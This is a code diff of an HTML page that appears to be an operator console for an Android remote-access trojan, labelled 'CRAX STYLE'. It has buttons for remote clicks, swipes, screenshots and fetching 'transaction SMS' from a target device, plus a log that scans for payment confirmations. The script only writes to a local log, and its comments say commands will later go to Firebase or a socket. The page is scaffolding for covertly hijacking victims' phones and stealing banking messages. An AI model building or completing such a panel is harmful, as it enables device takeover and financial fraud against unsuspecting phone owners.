@@ -1,26 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-    <title>Admin Control Panel</title>
+    <meta charset="UTF-8">
+    <title>Advance Command Center v2.0</title>
     <style>
-        body { font-family: Arial; text-align: center; background: #1a1a1a; color: white; }
-        .btn { padding: 20px 40px; margin: 10px; font-size: 18px; cursor: pointer; border-radius: 10px; border: none; }
-        .click { background: #4CAF50; color: white; }
-        .back { background: #f44336; color: white; }
-        #status { margin-top: 20px; color: #ffeb3b; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .dashboard { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        .panel { border: 1px solid #333; padding: 15px; background: #111; border-radius: 5px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 15px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #00ff00; color: #000; box-shadow: 0 0 10px #00ff00; }
+        .log-area { height: 300px; overflow-y: scroll; background: #000; padding: 10px; font-size: 12px; border: 1px inset #333; }
+        .status-online { color: #00ff00; font-weight: bold; }
+        h2 { border-bottom: 2px solid #00ff00; padding-bottom: 5px; }
     </style>
 </head>
 <body>
-    <h1>Remote Control System</h1>
-    <button class="btn click" onclick="sendCmd('CLICK')">Remote Click (टच करें)</button>
-    <button class="btn back" onclick="sendCmd('BACK')">Go Back (पीछे जाएँ)</button>
-    <div id="status">प्रतीक्षा में...</div>
+    <h1>SYSTEM CONTROL PANEL (CRAX STYLE)</h1>
+    <div class="dashboard">
+        <div class="panel">
+            <h2>Remote Gestures</h2>
+            <div class="btn-grid">
+                <button onclick="sendRemote('CLICK', 'x=500,y=1000')">🎯 REMOTE CLICK</button>
+                <button onclick="sendRemote('SWIPE', 'up')">⬆️ SWIPE UP</button>
+                <button onclick="sendRemote('BACK', '')">⬅️ GO BACK</button>
+                <button onclick="sendRemote('HOME', '')">🏠 HOME KEY</button>
+                <button onclick="sendRemote('GET_SMS', 'verify')">📩 FETCH TRANSACTION SMS</button>
+                <button onclick="sendRemote('SCREENSHOT', 'now')">📸 CAPTURE SCREEN</button>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>Device Status</h2>
+            <p>Target ID: <span id="target-id">WAITING...</span></p>
+            <p>Connection: <span class="status-online">CONNECTED</span></p>
+            <hr>
+            <h3>Live Logs</h3>
+            <div id="logs" class="log-area">Ready to receive data...</div>
+        </div>
+    </div>
 
     <script>
-        function sendCmd(action) {
-            document.getElementById('status').innerText = "कमांड भेजी गई: " + action;
-            // यहाँ हम Firebase या Database का URL डालेंगे ताकि ऐप तक डेटा पहुँचे
-            console.log("Sending Command to App: " + action);
+        // चाणक्य की नीति: डेटा को सुरक्षित और गुप्त रखें [cite: 2025-12-24]
+        function sendRemote(type, params) {
+            const timestamp = new Date().toLocaleTimeString();
+            const logBox = document.getElementById('logs');
+            
+            // यहाँ हम आपके डेटाबेस (Firebase/Socket) को कमांड भेजेंगे
+            logBox.innerHTML += `<div>[${timestamp}] Command Sent: ${type} ${params}</div>`;
+            logBox.scrollTop = logBox.scrollHeight;
+
+            // Transaction Verification Logic [cite: 2025-12-28]
+            if(type === 'GET_SMS') {
+                logBox.innerHTML += `<div style="color:yellow;">[System] Scanning for payment confirmations...</div>`;
+            }
         }
     </script>
 </body>
